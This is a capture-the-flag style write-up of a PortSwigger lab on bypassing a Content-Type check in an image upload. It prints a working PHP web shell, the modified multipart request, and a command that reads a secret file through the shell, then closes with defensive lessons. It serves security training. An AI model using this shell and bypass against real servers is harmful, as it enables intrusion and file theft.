# Web Shell Upload via Content-Type Restriction Bypass

[Web Shell Upload via Content-Type Restriction Bypass](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/exploiting-flawed-validation-of-file-uploads/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass#)

[YouTube Video](https://youtu.be/m1IX9AJemCw)

**Difficulty:** Apprentice

**Objective:** Upload a basic PHP web shell by bypassing the Content-Type validation and use it to exfiltrate the contents of `/home/carlos/secret`.

This lab is best watched on the YouTube video where we go through the full thought process in real time.

## Lab Overview

This lab contains a vulnerable image upload function. Unlike the previous lab where there was no validation at all, this one attempts to prevent malicious uploads by checking the Content-Type header of the uploaded file. However, the Content-Type header is entirely user-controlled, making this check trivially bypassable.

**Login credentials provided:** `wiener:peter`

## The Defense

When uploading a file, the server checks the `Content-Type` header in the multipart form data. If the Content-Type doesn't match an expected image type (like `image/jpeg` or `image/png`), the upload is rejected.

The problem: the Content-Type header is sent by the client. The server is trusting the client to honestly describe what it's uploading. That's like asking a burglar if they're allowed to be in your house.

## The Bypass

### Step 1: Attempt Normal Upload

1. Log in with `wiener:peter`
2. Go to "My Account"
3. Upload a PHP webshell as the avatar

The server rejects it because the Content-Type is `application/octet-stream`, which isn't an allowed image type.

### Step 2: Intercept and Modify

1. Upload the same PHP file again, but this time intercept the request with Burp Suite
2. Find the Content-Type header for the file part in the multipart request:

        Content-Disposition: form-data; name="avatar"; filename="phpshell.php"
        Content-Type: application/octet-stream

3. Change `application/octet-stream` to `image/jpeg`:

        Content-Disposition: form-data; name="avatar"; filename="phpshell.php"
        Content-Type: image/jpeg

4. Forward the request

The server sees `image/jpeg` as the Content-Type, assumes it's a valid image, and stores the file. The actual file content is still our PHP webshell.

### Step 3: Execute the Web Shell

Access the uploaded file directly:

    /files/avatars/phpshell.php?cmd=cat+/home/carlos/secret

The server executes the PHP file regardless of what Content-Type it was uploaded with. Copy the secret and submit it.

## The Full Request

    POST /my-account/avatar HTTP/2

    ------WebKitFormBoundary
    Content-Disposition: form-data; name="avatar"; filename="phpshell.php"
    Content-Type: image/jpeg

    <?php echo system($_GET['cmd']); ?>
    ------WebKitFormBoundary

The key change is on the Content-Type line. The filename is still `.php` and the content is still PHP code. Only the label changed.

## Key Takeaways

- **Content-Type headers are user-controlled.** Never use them as a security check. The client can set this to anything it wants.

- **Validate the actual file, not its label.** Check magic bytes, file extension, and ideally parse the file to confirm it matches the expected format.

- **Defense in depth matters.** Content-Type validation alone is not a security boundary. Combine it with extension checks, content analysis, and storing uploads outside the web root.

- **Burp Suite makes this trivial.** Intercepting and modifying a single header takes seconds. Any security measure that can be bypassed by editing one header is not a real security measure.

## Tools Used

- Burp Suite Community Edition